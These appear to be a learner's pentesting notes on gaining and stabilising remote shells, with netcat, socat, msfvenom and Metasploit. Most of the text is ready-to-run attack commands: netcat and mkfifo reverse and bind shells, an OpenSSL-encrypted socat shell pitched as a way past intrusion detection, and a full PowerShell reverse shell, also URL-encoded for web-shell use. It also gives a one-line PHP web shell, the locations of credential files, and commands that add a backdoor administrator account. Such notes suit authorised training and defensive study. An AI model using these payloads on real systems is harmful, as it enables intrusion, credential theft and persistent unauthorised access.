# Repository on Shells
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [SecLists](https://github.com/danielmiessler/SecLists)
* **Kali Linux** -> `/usr/share/webshells`
* **My Parrot OS** -> `/usr/share/wordlists/SecLists/Web-Shells`

# Tools
* Netcat
* Socat
* Metasploit Multihandler
* Msfvenom

# Types of Shells
* Reverse Shell
* Bind Shell

## Netcat Shells 101

Netcat, the Swiss Army knife of pentesting, is crucial for networking tasks. Let's delve into shells:

### Reverse Shells

Setting up a netcat listener on Linux is as easy as:

```bash
nc -lvnp <port-number>
```

- `-l`: listener
- `-v`: verbose output
- `-n`: skip DNS resolution
- `-p`: specify the port

For example, to listen on port 443:

```bash
sudo nc -lvnp 443
```

Choose ports wisely; sudo needed for < 1024. Common choices: 80, 443, or 53.

#### Connecting Back

Connect back with payloads based on the target environment. Check the example in the previous task for a connection demonstration.

### Bind Shells

For bind shells, assume a waiting listener on the target:

```bash
nc <target-ip> <chosen-port>
```

Make an outbound connection to the target on your chosen port. Task 8 will cover creating a listener for bind shells. The key here is understanding how to connect to a listening port using netcat. 🚀

### Illustrating Shells using NetCat

![bindreverse-removebg-preview](https://github.com/PranjalBasak/Documentation/assets/66166653/115194d8-e7a9-425e-a1fc-fe555c16b0b4)

## Stabilizing Netcat Shells on Linux

So, you've got a Netcat shell, but it's a bit wonky. Here are three techniques to make it more stable on Linux:

### Technique 1: Python Magic

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

Backgrounding the shell and foregrounding it again improves functionality. If the shell dies, type `reset` to fix visibility issues.

### Technique 2: rlwrap

Install rlwrap with `sudo apt install rlwrap` and use it with Netcat:

```bash
rlwrap nc -lvnp <port>
```

Provides history, tab completion, and arrow keys. Handy for stabilizing Windows shells too.

### Technique 3: Socat Stepping Stone

For Linux targets, use Socat for a more stable shell:

1. Transfer a statically compiled socat binary to the target.
2. Download it using Netcat: `wget <LOCAL-IP>/socat -O /tmp/socat`.
3. Execute socat for a more fully-featured shell.

Change your terminal size manually for tasks like text editing:

```bash
stty -a (note rows and columns values)
stty rows <number> && stty cols <number>
```

Adjusting terminal size helps programs like text editors work correctly. Choose the technique that fits your scenario! 🚀

## Quick Summary
### Reverse Shell
#### On the attacking machine
```bash
sudo nc -lvnp 443
```

### On the target
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

### Bind Shell
#### On the target
```bash
nc -lvnp <port> -e "cmd.exe"
```
#### On the attacking machine
```bash
nc MACHINE_IP <port>
```


# Socat
Socat is similar to Netcat. It works as a connector between two points.

## Reverse Shells
### Syntax for A Listener/Attacker
```bash
socat TCP-L:<port> -
```
Connects Two points (a listening port, and standard input)
  
###  To Connect Back on A Windows Target
```bash
$socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
# The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output
```

###  To Connect Back on A Linux Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells
### On A Linux Target
```bash
`socat TCP-L:<PORT> EXEC:"bash -li"
```

### On A Windows Target
```bash
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
```bash

### Attacker (Regardless of target platform)
```bash
 `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
```

## A Fully Stable TTY Reverse Shell Using Socat
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
We are passing in the current TTY as a file and setting the echo to be zero

<br> <br> <br><br> <br> <br>
# Socat Encrypted Shells
Encryption helps us bypass IDS <br>
We Will use OPENSSL instead of TCP <br>
## Generate A Certificate
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
## Merge 2 files into one
```bash
cat shell.key shell.crt > shell.pem
```
## Set Up Reverse Shell Listener on Attacker
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
## To Connect Back on Target Machine
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## Blind Shell
### Target
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

### Attacker
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
------------------------------------------------------------------------------------------------------------------
<br> <br> <br><br> <br> <br>
# Common Shell Payloads
## Windows
### Bind Shell; Set Up A Listener
```bash
nc -lvnp <PORT> -e /bin/bash
```
### Reverse Shell; Connecting Back
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

## Linux
### Bind Shell; Create A Listener
```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Reverse Shell; Connecting Back
```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Create A PowerShell Reverse Shell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
* Replace the IP and port
* Will work on cmd.exe shell or webshell
<br> <br> <br><br> <br> <br>
# Msfvenom
Standard Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
<br>To generate a Windows x64 Reverse Shell in an exe format: <br>
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

## Payloads
* Staged: 2 Parts; 1. Small Stager (Creates Connection) & 2. Bulkier Reverse Shell Code downloaded later
* Stageless: Self-contained Payloads that immediately sends a shell back <br>
**NOTE:** Stageless Payloads are easier to send but easily discovered by AV. Staged Payloads are more efficient.

## Meterpreter
* Metasploit's Own Shells and they must be caught in metasploit
* Fully Stable
* Good for Windows Targets

## Payload Naming Conventions
Basic Convention: `<OS>/<arch>/<payload>` <br>
For example:
`linux/x86/shell_reverse_tcp` <br>
The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.: `windows/shell_reverse_tcp`

<br>
For a 64bit Windows target, the arch would be specified as normal (x64).

For Full List of Payloads:
```bash
msfvenom --list payloads
```

### Optional Read
In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
`shell/reverse_tcp`
<br>
As staged payloads are denoted with another forward slash (/).
<br>
This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this: `windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:
`linux/x86/meterpreter_reverse_tcp`

# Metasploit multi/handler
Multi/Handler is a superb tool for catching reverse shells. <br>
Fortunately, it's relatively easy to use:
* Open Metasploit with `msfconsole`
* Type `use multi/handler`, and press enter
* See options available with the `options` command
* Then run the following commands:
  *  `set PAYLOAD <payload>`
  *  `set LHOST <listen-address>`
  *  `set LPORT <listen-port>`
* Start listener using `exploit -j` command
  When the staged payload is run by the target, Metasploit receives the connection and sends the remainder of the payload and finally gives us a reverse shell
<br> `multi/handler` will get backgrounded. To forground it:
  * `sessions` : See all active sessions
  * `sessions <number>`
 
# WebShells
* WebShell is a script that runs inside a webserver(PHP or ASP lang.)
* Commands are entered though-
    * HTML Form
    * URL Arguments
* In a very basic one line format(What happens under the hood):
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
* Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.
* When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
* Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

# Final Thoughts
Even Linux Shells are not completely stable. So we can try to `ssh` for full stability. Following directories are important:
* `/home/<user>/.ssh`
* `/etc/shadow`
* `/etc/passwd`

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`
 These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:
```powershell
net user <username> <password> /add
```
```powershell
net localgroup administrators <username> /add
```
